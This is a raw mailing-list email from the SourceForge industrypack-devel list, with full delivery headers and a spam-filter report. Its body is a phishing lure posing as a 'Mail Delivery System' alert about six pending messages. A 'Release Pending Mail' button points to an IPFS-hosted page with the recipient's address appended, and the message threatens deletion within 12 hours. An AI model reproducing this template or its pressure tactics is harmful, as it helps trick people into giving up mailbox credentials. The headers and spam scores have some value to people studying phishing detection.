Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 406C79299A0
	for <lists+industrypack-devel@lfdr.de>; Sun,  7 Jul 2024 21:58:54 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sQY27-0000fO-Rc
	for lists+industrypack-devel@lfdr.de;
	Sun, 07 Jul 2024 19:58:52 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <industrypack-devel@lists.sourceforge.net>)
 id 1sQY26-0000fC-Qn for industrypack-devel@lists.sourceforge.net;
 Sun, 07 Jul 2024 19:58:51 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=IlSSuNQyfLaokl8WsaJgWSsiqkJCqbcqHzSoz2CpUuY=; b=YDab7/iylPFQuKOXBYrr/Welim
 nXn4aH3bk2NO/3mIHhqtUb2uzj4lra8YQI/Ahi/wxLhVJ0leLSk53mdKNiRPMdtY1Q6dD4vjCqcIl
 sWJPESXFlX655AnOzcBXS8T8iLtXWDqH4SVgHAbgUmKA+x13tdU4avnWv3OH81OXgKPM=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=IlSSuNQyfLaokl8WsaJgWSsiqkJCqbcqHzSoz2CpUuY=; b=U
 wllOXQcEsGvom+tDeFyndi1VZkLXMbTrJlKj5ynVzjGf47qpMtHEHpPEutC77OMYI632UswPzLWWc
 +fwiuUCA8aYKr/fsjfB9nW3fhZAdkuAbMFzVNOVJ0UDIxNejDbt28D6Tm3WkuJHHfJZAi+kSynAit
 Faox3xFewwSA2Te8=;
Received: from [85.17.9.170] by sfi-mx-2.v28.lw.sourceforge.com with esmtp 
 (Exim 4.95) id 1sQY27-0003F3-3H
 for industrypack-devel@lists.sourceforge.net;
 Sun, 07 Jul 2024 19:58:51 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 7 Jul 2024 12:58:44 -0700
Message-ID: <20240707125844.E1EB5CDEE7263D75@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 2.8 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: You have (6) important incoming emails pending on your domain
 server. A system error occurred at 7/7/2024 12:58:44 p.m. Release pending
 emails to your mailbox with the button below. 
 Content analysis details:   (2.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: lighthouse.storage]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.17.9.170 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.17.9.170 listed in sa-trusted.bondedsender.org]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [85.17.9.170 listed in list.dnswl.org]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.7 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 1.0 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
 0.0 TO_EQ_FM_DIRECT_MX     To == From and direct-to-MX
 0.0 TO_EQ_FM_HTML_ONLY     To == From and HTML only
 0.8 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
 0.9 TO_EQ_FM_DOM_HTML_ONLY To domain == From domain and HTML only
X-Headers-End: 1sQY27-0003F3-3H
Subject: [Industrypack-devel] You have 6 messages pending to your mailbox
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Mail Delivery System via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Mail Delivery System <industrypack-devel@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============2437817079329650894=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2437817079329650894==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139"></head>
<body>
<p>
<table width=3D"100%" style=3D'border-radius: 0px; color: rgb(0, 0, 0); tex=
t-transform: none; letter-spacing: normal; font-family: "Google Sans", Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style=
: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans=
: 2; widows: 2; background-color: rgb(249, 247, 247); font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0">
<tbody style=3D"border-radius: 0px;">
<tr style=3D"border-radius: 0px;">
<td style=3D"margin: 0px; padding: 15px 20px 15px 15px; border-radius: 0px;=
">
<div style=3D"border-radius: 0px; padding-top: 0px; font-family: Tahoma, Ve=
rdana, sans-serif; border-top-width: 0px;">
<div style=3D"border-radius: 0px; color: rgb(57, 61, 71); line-height: 1.5;=
 padding-top: 0px; font-family: Tahoma, Verdana, Segoe, sans-serif; border-=
top-width: 0px;">
<p style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: cent=
er; line-height: 1.5; font-size: 13px;">You have (6) important incoming ema=
ils pending on<span>&nbsp;your</span><span>&nbsp;</span>domain<span>&nbsp;<=
/span>server.&nbsp;</p>
<p style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: cent=
er; line-height: 1.5; font-size: 13px;"><br></p>
<p style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: cent=
er; line-height: 1.5; font-size: 13px;">A system error occurred at 7/7/2024=
 12:58:44 p.m.<br style=3D"border-radius: 0px;"><br style=3D"border-radius:=
 0px;">Release pending emails to your mailbox with the button below.<br sty=
le=3D"border-radius: 0px;"><br style=3D"border-radius: 0px;"></p>
<p style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: cent=
er; line-height: 1.5; font-size: 13px;">Note: Pending emails will be delete=
d automatically from the system within a period of 12 hours.</p></div></div=
></td></tr></tbody></table>
<table width=3D"100%" style=3D'border-radius: 0px; color: rgb(0, 0, 0); tex=
t-transform: none; letter-spacing: normal; font-family: "Google Sans", Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style=
: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans=
: 2; widows: 2; background-color: rgb(249, 247, 247); font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"10">
<tbody style=3D"border-radius: 0px;">
<tr style=3D"border-radius: 0px;">
<td style=3D"margin: 0px; border-radius: 0px;">
<div align=3D"center" style=3D"border-radius: 0px; padding-top: 0px; border=
-top-width: 0px;">
<a style=3D"border-radius: 4px; border: 1px solid rgb(138, 59, 143); width:=
 auto; color: rgb(255, 255, 255); padding-top: 5px; padding-bottom: 5px; fo=
nt-family: Tahoma, Verdana, Segoe, sans-serif; display: inline-block; outli=
ne-width: medium; outline-style: none; background-color: rgb(0, 2, 165); te=
xt-decoration-line: none;" href=3D"https://gateway.lighthouse.storage/ipfs/=
bafkreidsw4el5ro4bofei2s62k57busvnkrxpspc72736o3x2f4lwz5gei#industrypack-de=
vel@lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
pfs.com/ipfs/QmZLkHRvYM91HFvsTESXrcfyrCic9An2K2FiGtEJoVTCZY?%23mjyeres@path=
com.com&amp;source=3Dgmail&amp;ust=3D1700721392174000&amp;usg=3DAOvVaw1noEI=
eYeEBiklcqBohrUsl" data-saferedirectreason=3D"1">
<span style=3D"border-radius: 0px; padding-right: 20px; padding-left: 20px;=
 font-size: 13px; display: inline-block;"><span style=3D"border-radius: 0px=
; line-height: 1.2; font-size: 16px;"><span style=3D"border-radius: 0px; li=
ne-height: 19px; font-size: 13px;">Release Pending Mail</span></span></span=
></a></div></td></tr></tbody></table>
<table width=3D"100%" style=3D'border-radius: 0px; color: rgb(0, 0, 0); tex=
t-transform: none; letter-spacing: normal; font-family: "Google Sans", Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style=
: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans=
: 2; widows: 2; background-color: rgb(249, 247, 247); font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"10">
<tbody style=3D"border-radius: 0px;">
<tr style=3D"border-radius: 0px;">
<td style=3D"margin: 0px; border-radius: 0px;">
<div align=3D"center" style=3D"border-radius: 0px; padding-top: 0px; border=
-top-width: 0px;">
<table width=3D"100%" style=3D"border-radius: 0px;" border=3D"0" cellspacin=
g=3D"0" cellpadding=3D"0">
<tbody style=3D"border-radius: 0px;">
<tr style=3D"border-radius: 0px;">
<td style=3D"margin: 0px; border-radius: 0px; line-height: 1px; font-size: =
1px; border-top-color: rgb(187, 187, 187); border-top-width: 2px; border-to=
p-style: solid;">&#8202;</td></tr></tbody></table></div></td></tr></tbody><=
/table>
<table width=3D"100%" style=3D'border-radius: 0px; color: rgb(0, 0, 0); tex=
t-transform: none; letter-spacing: normal; font-family: "Google Sans", Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style=
: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans=
: 2; widows: 2; background-color: rgb(249, 247, 247); font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"10">
<tbody style=3D"border-radius: 0px;">
<tr style=3D"border-radius: 0px;">
<td style=3D"margin: 0px; border-radius: 0px;">
<div style=3D"border-radius: 0px; padding-top: 0px; font-family: sans-serif=
; border-top-width: 0px;">
<div style=3D"border-radius: 0px; color: rgb(57, 61, 71); line-height: 1.2;=
 padding-top: 0px; font-family: Tahoma, Verdana, Segoe, sans-serif; border-=
top-width: 0px;">
<p style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: cent=
er; line-height: 1.5;"><font size=3D"1"><span style=3D"border-radius: 0px;"=
>This message is strictly for the attention of&nbsp;</span><a style=3D"colo=
r: rgb(0, 105, 166);" href=3D"mailto:industrypack-devel@lists.sourceforge.n=
et" target=3D"_blank" rel=3D"noreferrer">industrypack-devel@lists.sourcefor=
ge.net</a></font></p></div></div></td></tr></tbody></table><p></p></body></=
html>


--===============2437817079329650894==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2437817079329650894==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2437817079329650894==--
